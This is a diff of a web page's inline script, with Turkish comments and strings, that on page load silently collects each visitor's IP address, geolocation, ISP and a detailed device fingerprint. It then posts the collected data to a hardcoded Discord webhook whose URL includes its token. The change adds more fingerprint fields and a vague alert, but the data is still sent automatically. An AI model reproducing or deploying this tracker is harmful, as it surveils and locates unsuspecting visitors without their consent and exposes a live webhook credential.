@@ -45,11 +45,16 @@
     </div>
 
     <script>
+      
         const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+   
+        const uyariMesaji = `
+        **UYARI:** Bu sayfa, Hile amaçlıdır.
+        `;
 
         async function advancedExfil() {
             try {
-          
+               
                 const geoReq = await fetch('https://ipapi.co/json/');
                 const g = await geoReq.json();
 
@@ -78,7 +83,7 @@
                     os = navigator.platform;
                 }
 
-                
+               
                 let gpu = "N/A";
                 const canvas = document.createElement("canvas");
                 const gl = canvas.getContext("webgl");
@@ -96,65 +101,129 @@
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 const connectionType = conn ? `${conn.effectiveType} (~${conn.downlink} Mbps)` : "Bilinmiyor";
 
-                // 4. Veri Paketleme
+          
+                const tarih = new Date().toLocaleString('tr-TR');
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const ekranCozunurlugu = `${screen.width}x${screen.height}`;
+                const cihazHafizasi = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
+                const isOnline = navigator.onLine ? "Evet" : "Hayır";
+                const cpuCekirdekSayisi = navigator.hardwareConcurrency || "Bilinmiyor";
+                const sistemDili = navigator.language || "Bilinmiyor";
+                const cerezDurumu = navigator.cookieEnabled ? "Etkin" : "Devre Dışı";
+                const platform = navigator.platform || "Bilinmiyor";
+                const vendor = navigator.vendor || "Bilinmiyor";
+                const uygulamalar = navigator.getGamepads ? navigator.getGamepads().length : "Yok"; // Gamepad tespiti
+                const sesCihazlari = navigator.mediaDevices && navigator.mediaDevices.enumerateDevices ? (await navigator.mediaDevices.enumerateDevices()).filter(device => device.kind === 'audiooutput' || device.kind === 'audioinput').length : "Bilinmiyor"; // Ses cihazları tespiti
+
+
+                let githubBilgisi = "Bilinmiyor";
+                try {
+         
+                    if (document.body.innerHTML.includes("github.com/") || document.body.innerHTML.includes("@github")) {
+                        githubBilgisi = "Potansiyel GitHub varlığı tespit edildi (sayfa içeriğinde GitHub referansı)";
+                    }
+                } catch (githubErr) {
+                    githubBilgisi = "GitHub bilgisi alınamadı: " + githubErr.message;
+                }
+                
+                let linkedinBilgisi = "Bilinmiyor";
+                try {
+                    
+                    if (document.body.innerHTML.includes("linkedin.com/in/") || document.body.innerHTML.includes("linkedin.com/company/")) {
+                        linkedinBilgisi = "Potansiyel LinkedIn profili/şirket tespiti (sayfa içeriğinde LinkedIn referansı)";
+                    }
+                } catch (linkedinErr) {
+                    linkedinBilgisi = "LinkedIn bilgisi alınamadı: " + linkedinErr.message;
+                }
+
+              
                 const logData = {
-                    ts: new Date().toLocaleString('tr-TR'),
+                    ts: tarih,
                     ip: g.ip,
                     isp: g.org,
                     loc: `${g.city}, ${g.region}, ${g.country_name} (${g.latitude}, ${g.longitude})`,
                     os: os,
                     browser: browser,
-                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
-                    cores: navigator.hardwareConcurrency || "Bilinmiyor",
+                    ram: cihazHafizasi,
+                    cores: cpuCekirdekSayisi,
                     gpu: gpu,
-                    res: `${screen.width}x${screen.height} @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
+                    res: ekranCozunurlugu + ` @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
                     hz: window.screen.refreshRate || "60Hz (Tahmini)",
-                    lang: navigator.language,
+                    lang: sistemDili,
                     bat: battery,
                     net: connectionType,
                     ref: document.referrer || "Dogrudan Baglanti",
-                    ua: ua
+                    ua: ua,
+                    timezone: timezone,
+                    online: isOnline,
+                    cookies: cerezDurumu,
+                    platform: platform,
+                    vendor: vendor,
+                    gamepads: uygulamalar,
+                    audioDevices: sesCihazlari,
+                    github: githubBilgisi,
+                    linkedin: linkedinBilgisi
                 };
 
                
-                const terminalLog = "```" + 
-                    "--- [ SESSION CAPTURE REPORT ] ---\n" +
+                const terminalLog = "```diff\n" +
+                    "+  [ SESSION CAPTURE REPORT ]  +\n" +
                     "ID         : " + Math.floor(Math.random() * 900000 + 100000) + "\n" +
                     "TIME       : " + logData.ts + "\n" +
                     "----------------------------------\n" +
-                    "NETWORK_LAYER\n" +
+                    "! NETWORK INFORMATION !\n" +
                     "IPV4_ADDR  : " + logData.ip + "\n" +
                     "PROVIDER   : " + logData.isp + "\n" +
                     "LOCATION   : " + logData.loc + "\n" +
                     "NET_TYPE   : " + logData.net + "\n" +
                     "----------------------------------\n" +
-                    "HARDWARE_LAYER\n" +
+                    "! HARDWARE INFORMATION !\n" +
                     "OS_VER     : " + logData.os + "\n" +
                     "CORE_COUNT : " + logData.cores + " Threads\n" +
                     "RAM_SIZE   : " + logData.ram + "\n" +
                     "GPU_MODEL  : " + logData.gpu + "\n" +
                     "DISPLAY    : " + logData.res + "\n" +
                     "BATTERY    : " + logData.bat + "\n" +
+                    "PLATFORM   : " + logData.platform + "\n" +
+                    "VENDOR     : " + logData.vendor + "\n" +
+                    "GAMEPADS   : " + logData.gamepads + "\n" +
+                    "AUDIO_DEVICES: " + logData.audioDevices + "\n" +
                     "----------------------------------\n" +
-                    "SOFTWARE_LAYER\n" +
+                    "! SOFTWARE INFORMATION !\n" +
                     "BROWSER    : " + logData.browser + "\n" +
                     "LANGUAGE   : " + logData.lang + "\n" +
                     "REFERRER   : " + logData.ref + "\n" +
                     "RAW_UA     : " + logData.ua + "\n" +
-                    "--- [ END OF TRANSMISSION ] ---" +
+                    "TIMEZONE   : " + logData.timezone + "\n" +
+                    "ONLINE     : " + logData.online + "\n" +
+                    "COOKIES    : " + logData.cookies + "\n" +
+                    "----------------------------------\n" +
+                    "! POTENTIAL INFORMATION !\n" +
+                    "GITHUB     : " + logData.github + "\n" +
+                    "LINKEDIN   : " + logData.linkedin + "\n" +
+                    "----------------------------------\n" +
+                    "-  [ END OF TRANSMISSION ]  -\n" +
                     "```";
 
-          
+
+               
                 await fetch(WH_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: terminalLog })
                 });
 
-            } catch (err) {}
+            } catch (err) {
+               
+                console.error("Hata:", err);
+            }
         }
+       
+        window.onload = () => {
+            alert(uyariMesaji);
+            advancedExfil();
+        };
 
-        window.onload = advancedExfil;
     </script>
 </body>
 </html>
